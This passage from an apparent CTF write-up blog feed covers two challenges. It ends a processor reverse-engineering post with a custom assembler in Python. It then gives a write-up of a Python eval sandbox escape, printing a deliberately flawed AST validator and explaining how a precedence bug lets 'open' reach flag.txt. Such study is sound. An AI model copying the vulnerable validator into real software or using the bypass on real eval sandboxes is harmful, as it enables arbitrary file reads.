&lt;td&gt;0x11&lt;/td&gt;
&lt;td&gt;call&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x12&lt;/td&gt;
&lt;td&gt;ret&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x13&lt;/td&gt;
&lt;td&gt;cmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x14&lt;/td&gt;
&lt;td&gt;push&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x15&lt;/td&gt;
&lt;td&gt;pop&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x17&lt;/td&gt;
&lt;td&gt;mmiv&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x18&lt;/td&gt;
&lt;td&gt;mmov&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;*The movl instruction isn’t directly plugged to &lt;code&gt;IR&lt;/code&gt;, it is the multiplexers on the right that are plugged to &lt;code&gt;IR&lt;/code&gt; and will execute (or not) movl depending on its value. But we can still guess its value by looking at the opcodes of &lt;code&gt;example.data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now that we did that, we can try to guess how the operands are encoded. We will first look at the first two instructions of &lt;code&gt;example.asm&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; ax, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Those are encoded as : &lt;code&gt;10000a 100101&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We know that 0x10 represents &lt;code&gt;movl&lt;/code&gt;, we can assume that literals are transmitted as so in the machine code (0xa = 10). Seeing that &lt;code&gt;ax&lt;/code&gt; is encoded as 0x00 and &lt;code&gt;bx&lt;/code&gt; as 0x01, we can establish this register encoding table:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Register&lt;/th&gt;
&lt;th&gt;Encoding&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ax&lt;/td&gt;
&lt;td&gt;0x00&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;bx&lt;/td&gt;
&lt;td&gt;0x01&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cx&lt;/td&gt;
&lt;td&gt;0x02&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dx&lt;/td&gt;
&lt;td&gt;0x03&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Last thing we need is knowing how labels are encoded. We will now look at the instruction that uses a label :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, :sub1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This instruction has been encoded as &lt;code&gt;100101&lt;/code&gt;. Now, we know that &lt;code&gt;sub1&lt;/code&gt;’s value is &lt;code&gt;01&lt;/code&gt;. Since &lt;code&gt;sub1&lt;/code&gt; starts at the second instruction, which has index 1 in the RAM, we can guess that labels are encoded as their index in the RAM.&lt;/p&gt;
&lt;p&gt;We now have almost everything we need to write our compiler. We can see two unknown instructions in the code of the program that we don’t have opcodes for, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;. We can see by looking at their module that they are setting the output register to :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;msk&lt;/span&gt; : (ax &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; dx) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mskb&lt;/span&gt; : dx &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As &lt;code&gt;movl&lt;/code&gt;, those instructions are always “executed” since they are not directly plugged to &lt;code&gt;IR&lt;/code&gt; but the multiplexer that is sending the result into output is so by manually setting registers and &lt;code&gt;IR&lt;/code&gt;, we can identify the opcodes by looking at the value of the CU’s output register (we didn’t manage to find a way to examine the internal circuits of the multiplexers and reading the XML seemed painful). By trying the few opcodes left, we got :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Opcode&lt;/th&gt;
&lt;th&gt;Instruction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x1a&lt;/td&gt;
&lt;td&gt;msk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1b&lt;/td&gt;
&lt;td&gt;mskb&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;Now that understand how the processor is working we can try to make a compiler to compile &lt;code&gt;program.asm&lt;/code&gt; into &lt;code&gt;program.data&lt;/code&gt;.
To do so we have to clarify a few things first :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Another odd thing in the code is the &lt;code&gt;sub5&lt;/code&gt; value that is not preceded by colons unlike the others, we assumed that it didn’t matter and it worked (we added the colons in the file to make the compiler simpler).&lt;/li&gt;
&lt;li&gt;Last thing we didn’t mention is that every instruction that needs less than two operands is padded with zeros so it stays 3-bytes long (we’d like to thank the challenge maker for putting zeros in the code when the second operand was useless, it makes the compiler way easier to make).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here comes our compiler :&lt;/p&gt;
&lt;p&gt;


  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;compiler.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
def get_instruction_type(instruction):
    if instruction[0] == &amp;#39;:&amp;#39;:
        return &amp;#39;label&amp;#39;
    return &amp;#39;instruction&amp;#39;

def get_opcode(instr):
    translate_table = [
        &amp;#34;add&amp;#34;,
        &amp;#34;sub&amp;#34;,
        &amp;#34;mul&amp;#34;,
        &amp;#34;clr&amp;#34;,
        &amp;#34;rst&amp;#34;,
        &amp;#34;jmp&amp;#34;,
        &amp;#34;ljmp&amp;#34;,
        &amp;#34;jlp&amp;#34;,
        &amp;#34;jg&amp;#34;,
        &amp;#34;jge&amp;#34;,
        &amp;#34;jl&amp;#34;,
        &amp;#34;jle&amp;#34;,
        &amp;#34;je&amp;#34;,
        &amp;#34;jz&amp;#34;,
        &amp;#34;jnz&amp;#34;,
        &amp;#34;mov&amp;#34;,
        &amp;#34;movl&amp;#34;,
        &amp;#34;call&amp;#34;,
        &amp;#34;ret&amp;#34;,
        &amp;#34;cmp&amp;#34;,
        &amp;#34;push&amp;#34;,
        &amp;#34;pop&amp;#34;,
        &amp;#34;div&amp;#34;,
        &amp;#34;mmiv&amp;#34;,
        &amp;#34;mmov&amp;#34;,
        &amp;#34;&amp;#34;,
        &amp;#34;msk&amp;#34;,
        &amp;#34;mskb&amp;#34;
    ]
    return format(translate_table.index(instr), &amp;#39;02x&amp;#39;)


def get_label_encoded(word, labels):
    # Very ugly but there is only one so it&amp;#39;s fine
    if &amp;#39;&amp;#43;1&amp;#39; in word:
        return &amp;#39;2f&amp;#39;
    else:
        return labels[word]

def get_operand_code(word, labels):
    regs = [&amp;#39;ax&amp;#39;, &amp;#39;bx&amp;#39;, &amp;#39;cx&amp;#39;, &amp;#39;dx&amp;#39;]
    if &amp;#39;:&amp;#39; in word:
        return get_label_encoded(word, labels)
    if &amp;#39;x&amp;#39; in word:
        if word in regs:
            return format(regs.index(word), &amp;#39;02x&amp;#39;)
        else:
            return format(int(word, 16), &amp;#39;02x&amp;#39;)
    else:
        return format(int(word), &amp;#39;02x&amp;#39;)


def get_instruction_sequence(instruction, labels):
    words = instruction.split()
    opcode = get_opcode(words[0])
    op1 = &amp;#39;00&amp;#39;
    op2 = &amp;#39;00&amp;#39;
    if len(words) == 3:
        op1 = get_operand_code(words[1].strip(&amp;#39;,&amp;#39;), labels)
        op2 = get_operand_code(words[2], labels)
    return opcode &amp;#43; op1 &amp;#43; op2

if __name__ == &amp;#39;__main__&amp;#39;:
    # don&amp;#39;t forget to add the &amp;#39;:&amp;#39; in front of sub5 line 53 or compiler will crash
    program_file = &amp;#39;./program.asm&amp;#39;
    output_file = &amp;#39;./program.data&amp;#39;
    filestream = open(program_file)
    program = filestream.read().splitlines()
    filestream.close()
    labels = {}
    data = []
    for index, instruction in enumerate(program):
        type = get_instruction_type(instruction)
        if type == &amp;#39;label&amp;#39;:
            labels[instruction] = format(index - len(labels), &amp;#39;02x&amp;#39;)
    # print(labels)
    for instruction in program:
        type = get_instruction_type(instruction)
        if type == &amp;#39;instruction&amp;#39;:
            data.append(get_instruction_sequence(instruction.strip(), labels))
    filestream = open(output_file, &amp;#39;w&amp;#39;)
    filestream.write(&amp;#39; &amp;#39;.join(data))
    filestream.close()
    print(&amp;#39;Program has been compiled in :&amp;#39;, output_file)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


a
Once our compiler has been written, we just have to compile the program, import it in the RAM then launch the simulation.
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_compiled.png&#34; alt=&#34;import&#34;&gt;
After a little while (a long while if you don’t increase the auto-tick frequency), the flag will be displayed on the TTY to the right.
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_flag.png&#34; alt=&#34;flag&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Tree of danger - [HTB UNICTF 2021 - Qualifiers]</title>
      <link>https://alagroy-42.github.io/writeups/tree_of_danger/</link>
      <pubDate>Tue, 14 Jun 2022 14:53:57 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/tree_of_danger/</guid>
      <description>The Challenge python util.py #!/usr/bin/env python3.10 import ast import math from typing import Union def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool: match type(node): case ast.Constant: return True case ast.List | ast.Tuple | ast.Set: return is_sequence_safe(node) case ast.Dict: return is_dict_safe(node) case ast.Name: return node.id == &amp;#34;math&amp;#34; and isinstance(node.ctx, ast.Load) case ast.UnaryOp: return is_expression_safe(node.operand) case ast.BinOp: return is_expression_safe(node.left) and is_expression_safe(node.right) case ast.Call: return is_call_safe(node) case ast.Attribute: return is_expression_safe(node.value) case _: return False def is_sequence_safe(node: Union[ast.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;util.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/env python3.10

import ast
import math
from typing import Union


def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool:
    match type(node):
        case ast.Constant:
            return True
        case ast.List | ast.Tuple | ast.Set:
            return is_sequence_safe(node)
        case ast.Dict:
            return is_dict_safe(node)
        case ast.Name:
            return node.id == &amp;#34;math&amp;#34; and isinstance(node.ctx, ast.Load)
        case ast.UnaryOp:
            return is_expression_safe(node.operand)
        case ast.BinOp:
            return is_expression_safe(node.left) and is_expression_safe(node.right)
        case ast.Call:
            return is_call_safe(node)
        case ast.Attribute:
            return is_expression_safe(node.value)
        case _:
            return False


def is_sequence_safe(node: Union[ast.List, ast.Tuple, ast.Set]):
    return all(map(is_expression_safe, node.elts))


def is_dict_safe(node: ast.Dict) -&amp;gt; bool:
    for k, v in zip(node.keys, node.values):
        if not is_expression_safe(k) and is_expression_safe(v):
            return False
    return True


def is_call_safe(node: ast.Call) -&amp;gt; bool:
    if not is_expression_safe(node.func):
        return False
    if not all(map(is_expression_safe, node.args)):
        return False
    if node.keywords:
        return False
    return True


def is_safe(expr: str) -&amp;gt; bool:
    for bad in [&amp;#39;_&amp;#39;]:
        if bad in expr:
            # Just in case!
            return False
    return is_expression_safe(ast.parse(expr, mode=&amp;#39;eval&amp;#39;).body)


if __name__ == &amp;#34;__main__&amp;#34;:
    print(&amp;#34;Welcome to SafetyCalc (tm)!\n&amp;#34;
          &amp;#34;Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc&amp;#34;)
    while True:
        ex = input(&amp;#34;&amp;gt; &amp;#34;)
        if is_safe(ex):
            try:
                print(eval(ex))
            except Exception as e:
                print(f&amp;#34;Something bad happened! {e}&amp;#34;)
        else:
            print(&amp;#34;Unsafe command detected! The snake approaches...&amp;#34;)
            exit(-1)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;This Python script is gonna interpret python code with the &lt;code&gt;eval&lt;/code&gt; function after doing some parsing with the AST module. The parsing is gonna make sure that every component of the evaluated expression is safe. Function calls are only considered safe if they are part of the &lt;code&gt;math&lt;/code&gt; module. After reading the &lt;code&gt;math&lt;/code&gt; documentation, we realized that there was no way of doing nasty things with any function so we decided to try to bypass the AST checks.&lt;/p&gt;
&lt;h2 id=&#34;the-resolution&#34;&gt;The Resolution&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_source_code.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this function, the if statement line 37 doesn&amp;rsquo;t take into account operator precedence in Python, since &lt;code&gt;not&lt;/code&gt; has a higher precedence than &lt;code&gt;and&lt;/code&gt;, &lt;code&gt;not&lt;/code&gt; only applies to the key verification and not to the value verification. If it returns &lt;code&gt;True&lt;/code&gt;, then the value of the dictionary is not gonna be checked. Thanks to that vulnerability, we can embed the open symbol in the dictionary.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_embedded.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
&lt;p&gt;Function calls are sanitized with a check on &lt;code&gt;ast.Name&lt;/code&gt; values which checks any normal function call but not class methods that are considered by the AST module as &lt;code&gt;ast.Attribute&lt;/code&gt;. Dereferencing a dictionary by calling directly the value is an &lt;code&gt;ast.Subscript&lt;/code&gt; type of operation which returns &lt;code&gt;False&lt;/code&gt;. We then have to call &lt;code&gt;dictionary.get&lt;/code&gt; to get &lt;code&gt;open&lt;/code&gt; and then call it on &lt;code&gt;flag.txt&lt;/code&gt;. Once the file is opened, we simply need to add the read method to get the content of it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_flag.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
